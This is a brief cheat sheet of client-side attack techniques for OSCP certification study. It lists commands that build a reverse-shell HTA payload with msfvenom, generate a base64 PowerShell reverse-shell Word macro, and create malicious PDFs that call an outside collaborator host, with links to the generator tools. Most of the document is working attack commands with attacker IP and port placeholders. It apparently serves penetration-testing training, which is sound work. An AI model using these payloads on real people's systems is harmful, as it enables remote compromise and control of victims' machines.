# OSCP Client-Side Attacks

## Introduction

## Table of Content
- [OSCP Client-Side Attacks](#oscp-client-side-attacks)
  - [Introduction](#introduction)
  - [Table of Content](#table-of-content)
  - [HTA Attack in Action](#hta-attack-in-action)
  - [Microsoft Word Macro Attack](#microsoft-word-macro-attack)
  - [Malicious PDF](#malicious-pdf)

## HTA Attack in Action

-> Get web browser name, operating system, device type  
https://explore.whatismybrowser.com/useragents/parse/#parse-useragent

-> Creating a malicious .hta with msfvenom
```sh
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
```

## Microsoft Word Macro Attack
-> Generate a malicious macro for reverse shell in powershell using base64 for .doc
```python
python evil_macro.py -l <ip> -p <port> -o macro.txt
```
https://github.com/rodolfomarianocy/Evil-Macro/


## Malicious PDF
-> Malicious PDF Generator
```sh
python3 malicious-pdf.py burp-collaborator-url
```
https://github.com/jonaslejon/malicious-pdf

-> evilpdf  
https://github.com/superzerosec/evilpdf
